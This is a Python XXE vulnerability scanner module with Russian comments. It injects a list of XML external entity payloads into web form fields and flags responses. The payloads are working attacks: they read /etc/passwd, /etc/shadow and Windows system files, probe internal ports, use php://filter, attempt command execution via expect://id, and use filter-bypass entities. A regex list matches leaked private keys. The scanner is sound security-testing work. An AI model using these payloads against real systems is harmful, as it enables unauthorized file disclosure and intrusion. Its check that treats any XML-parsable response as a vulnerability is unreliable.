import logging
from ..http_client_adapter import AiohttpClientAdapter
from typing import List, Dict, Optional
import re
import xml.etree.ElementTree as ET
from io import BytesIO
from urllib.parse import urlparse, urljoin

logger = logging.getLogger(__name__)

class XXEScanner:
    def __init__(self, client=None):
        # Инициализация HTTP клиента
        self.client = client if client else AiohttpClientAdapter()
        
        # Список полезных нагрузок для тестирования XXE уязвимостей
        self.payloads = [
            # Базовые XXE полезные нагрузки
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/hosts" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>',
            
            # Полезные нагрузки для чтения файлов Windows
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts" >]><foo>&xxe;</foo>',
            
            # Полезные нагрузки для SSRF через XXE
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://127.0.0.1:22" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://127.0.0.1:3306" >]><foo>&xxe;</foo>',
            
            # Полезные нагрузки для чтения переменных окружения
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "expect://id" >]><foo>&xxe;</foo>',
            
            # Полезные нагрузки для обхода фильтров
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "file:///etc/passwd" ><!ENTITY % int "<!ENTITY &#37; trick SYSTEM \'file:///%xxe;\'>">%int;%trick;]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "data://text/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" ><!ENTITY % int "<!ENTITY &#37; trick SYSTEM \'file:///%xxe;\'>">%int;%trick;]><foo>&xxe;</foo>'
        ]
        
        # Паттерны для определения конфиденциальных данных
        self.sensitive_patterns = [
            r'root:.*:0:0:',
            r'mysql:.*:',
            r'postgres:.*:',
            r'127\.0\.0\.1\s+localhost',
            r'PRIVATE KEY',
            r'BEGIN RSA PRIVATE KEY',
            r'BEGIN DSA PRIVATE KEY',
            r'BEGIN EC PRIVATE KEY',
            r'BEGIN OPENSSH PRIVATE KEY',
            r'\[extensions\]',
            r'\[fonts\]',
            r'\[files\]',
            r'\[Mail\]',
            r'\[MAPI\]'
        ]

    def scan(self, url: str, forms: Optional[List[Dict]] = None) -> List[Dict]:
        # Основной метод сканирования, который проверяет XXE уязвимости
        vulnerabilities = []
        
        try:
            # Проверка форм
            if forms:
                form_vulns = self._check_forms(url, forms)
                vulnerabilities.extend(form_vulns)
            
        except Exception as e:
            logger.error(f"XXE scan error: {str(e)}")
        
        return vulnerabilities

    def _check_forms(self, url: str, forms: List[Dict]) -> List[Dict]:
        # Проверка форм на XXE уязвимости
        vulnerabilities = []
        try:
            for form in forms:
                # Получение метода и действия формы
                method = form.get('method', 'GET').upper()
                action = form.get('action', url)
                
                # Проверка каждого поля формы
                for field in form.get('fields', []):
                    field_name = field.get('name')
                    field_type = field.get('type', 'text')
                    
                    # Пропуск полей, не подходящих для XXE
                    if field_type not in ['text', 'textarea', 'hidden', 'file']:
                        continue
                    
                    for payload in self.payloads:
                        try:
                            # Подготовка данных формы
                            form_data = {}
                            for f in form.get('fields', []):
                                if f.get('name') == field_name:
                                    form_data[f.get('name')] = payload
                                else:
                                    form_data[f.get('name')] = f.get('value', '')
                            
                            # Установка заголовка Content-Type для XML
                            headers = {'Content-Type': 'application/xml'}
                            
                            # Отправка запроса
                            if method == 'GET':
                                response = self.client.get(action, params=form_data, headers=headers, timeout=10)
                            else:
                                response = self.client.post(action, data=form_data, headers=headers, timeout=10)
                            
                            if not response:
                                continue
                            
                            # Проверка на уязвимость
                            if self._is_vulnerable(response.text, payload):
                                vulnerabilities.append({
                                    'type': 'XXE',
                                    'url': action,
                                    'payload': payload,
                                    'evidence': self._get_evidence(response.text, payload),
                                    'severity': 'high',
                                    'param': field_name,
                                    'method': method
                                })
                                break
                        
                        except Exception as e:
                            logger.error(f"Form field check error for {field_name}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Forms check error: {str(e)}")
        
        return vulnerabilities

    def _is_vulnerable(self, response_text: str, payload: str) -> bool:
        # Проверка, является ли ответ уязвимым к XXE
        try:
            # Попытка парсинга ответа как XML
            try:
                ET.parse(BytesIO(response_text.encode()))
                return True
            except:
                pass
            
            # Проверка наличия конфиденциальных данных
            for pattern in self.sensitive_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return True
            
            # Проверка отражения полезной нагрузки
            if payload in response_text:
                return True
            
            return False
        
        except Exception as e:
            logger.error(f"Vulnerability check error: {str(e)}")
            return False

    def _get_evidence(self, response_text: str, payload: str) -> str:
        # Получение доказательства уязвимости
        try:
            # Попытка парсинга ответа как XML
            try:
                tree = ET.parse(BytesIO(response_text.encode()))
                root = tree.getroot()
                return f"XML successfully parsed: {ET.tostring(root, encoding='unicode')}"
            except:
                pass
            
            # Поиск конфиденциальных данных
            for pattern in self.sensitive_patterns:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    return f"Sensitive data found: {match.group(0)}"
            
            # Поиск отражения полезной нагрузки
            if payload in response_text:
                return f"Payload '{payload}' was reflected in the response"
            
            return "XXE vulnerability detected"
        
        except Exception as e:
            logger.error(f"Evidence collection error: {str(e)}")
            return "Error collecting evidence" 